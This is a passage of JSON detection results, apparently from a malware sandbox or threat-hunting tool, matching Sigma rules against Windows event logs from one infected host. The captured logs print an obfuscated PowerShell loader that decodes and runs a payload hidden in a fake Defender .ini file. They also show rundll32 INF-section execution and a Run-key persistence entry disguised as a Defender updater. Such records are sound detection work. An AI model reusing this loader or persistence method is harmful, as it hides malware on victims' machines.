                                                                                                 "values":  "@{EventID=400; Data=[Available None \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.17134.858\n\tHostId=6e805092-d3c1-475e-b417-c9305b376e30\n\tHostApplication=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));\n\tEngineVersion=5.1.17134.858\n\tRunspaceId=9b01b783-b2d2-492f-aa0e-04af18d2ee6a\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=]}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "3df27b5ffb8110f82c5da9120fd9c1c88c792ef65770b7f2706fc60a04b9cc9c",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious XOR Encoded PowerShell Command Line - PowerShell",
                                                                       "rule_description":  "Detects suspicious powershell process which includes bxor command, alternative obfuscation method to b64 encoded commands.",
                                                                       "rule_author":  "Teymur Kheirkhabarov, Harish Segar (rule)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F52-6565-5406-000000004800}; ProcessId=3616; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows host process (Rundll32); Company=Microsoft Corporation; ParentProcessGuid={C784477D-3009-6538-6600-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A; OriginalFileName=RUNDLL32.EXE; ParentImage=C:\\Windows\\explorer.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4736; CurrentDirectory=C:\\windows\\system32\\; CommandLine=\"C:\\windows\\system32\\rundll32.exe\" advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\rundll32.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\Explorer.EXE; UtcTime=1701125970; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F5A-6565-5706-000000004800}; ProcessId=3284; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows host process (Rundll32); Company=Microsoft Corporation; ParentProcessGuid={C784477D-3009-6538-6600-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A; OriginalFileName=RUNDLL32.EXE; ParentImage=C:\\Windows\\explorer.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4736; CurrentDirectory=C:\\windows\\system32\\; CommandLine=\"C:\\windows\\system32\\rundll32.exe\" advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\rundll32.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\Explorer.EXE; UtcTime=1701125978; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F9E-6565-5C06-000000004800}; ProcessId=2548; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows host process (Rundll32); Company=Microsoft Corporation; ParentProcessGuid={C784477D-3009-6538-6600-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A; OriginalFileName=RUNDLL32.EXE; ParentImage=C:\\Windows\\explorer.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4736; CurrentDirectory=C:\\windows\\system32\\; CommandLine=\"C:\\windows\\system32\\rundll32.exe\" advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\rundll32.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\Explorer.EXE; UtcTime=1701126046; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1FA6-6565-5F06-000000004800}; ProcessId=4592; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows host process (Rundll32); Company=Microsoft Corporation; ParentProcessGuid={C784477D-3009-6538-6600-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A; OriginalFileName=RUNDLL32.EXE; ParentImage=C:\\Windows\\explorer.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4736; CurrentDirectory=C:\\windows\\system32\\; CommandLine=\"C:\\windows\\system32\\rundll32.exe\" advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\rundll32.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\Explorer.EXE; UtcTime=1701126054; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "63bcc6f98c4a5594772428a329b433392d70f18a841926328607f303f3d782a5",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Rundll32 Spawned Via Explorer.EXE",
                                                                       "rule_description":  "Detects execution of \"rundll32.exe\" with a parent process of Explorer.exe. This has been observed by variants of Raspberry Robin, as first reported by Red Canary.",
                                                                       "rule_author":  "CD_ROM_"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=1848; DestinationPortName=https; SourceIsIpv6=false; DestinationIp=104.237.62.212; Initiated=true; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; RuleName=-; DestinationHostname=api.ipify.org; UtcTime=1698181567; User=DESKTOP-B0T93D6\\george; DestinationPort=443; ProcessGuid={C784477D-1F52-6565-5506-000000004800}; SourcePort=49744; Protocol=tcp; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.26; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=1848; DestinationPortName=https; Protocol=tcp; DestinationIp=104.237.62.212; Initiated=true; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; RuleName=-; DestinationHostname=api.ipify.org; UtcTime=1698181573; User=DESKTOP-B0T93D6\\george; DestinationPort=443; ProcessGuid={C784477D-1F52-6565-5506-000000004800}; SourcePort=49745; SourceIsIpv6=false; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.26; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=2052; DestinationPortName=https; SourceIsIpv6=false; DestinationIp=64.185.227.156; Initiated=true; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; RuleName=-; DestinationHostname=api.ipify.org; UtcTime=1698181574; User=DESKTOP-B0T93D6\\george; DestinationPort=443; ProcessGuid={C784477D-1F5A-6565-5806-000000004800}; SourcePort=49746; Protocol=tcp; DestinationIsIpv6=false; SourceIp=192.168.2.26; SourceHostname=DESKTOP-B0T93D6.local}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=1848; DestinationPortName=https; SourceIsIpv6=false; Initiated=true; DestinationIp=104.237.62.212; SourcePortName=-; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; RuleName=-; DestinationHostname=api.ipify.org; UtcTime=1698181578; User=DESKTOP-B0T93D6\\george; DestinationPort=443; ProcessGuid={C784477D-1F52-6565-5506-000000004800}; SourcePort=49747; Protocol=tcp; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.26; DestinationIsIpv6=false}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "7b06f86400ae084ca05c7e2cefe70b8ea4910b6196d969ae516b9d5d1c99bfe5",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Network Connection to IP Lookup Service APIs",
                                                                       "rule_description":  "Detects external IP address lookups by non-browser processes via services such as \"api.ipify.org\". This could be indicative of potential post compromise internet test activity.",
                                                                       "rule_author":  "Janantha Marasinghe, Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=1940; EventType=SetValue; Image=C:\\Windows\\system32\\wbem\\wmiprvse.exe; ProcessGuid={C784477D-1F45-6565-5206-000000004800}; UtcTime=1701125958; Details=c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,; RuleName=T1060,RunKey; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefenderUpdater}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=1848; EventType=SetValue; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-1F52-6565-5506-000000004800}; UtcTime=1701126036; Details=c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,; RuleName=T1060,RunKey; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\7A002242-98C7-C640-DF13-F92F76F77DF9}"
                                                                                             },
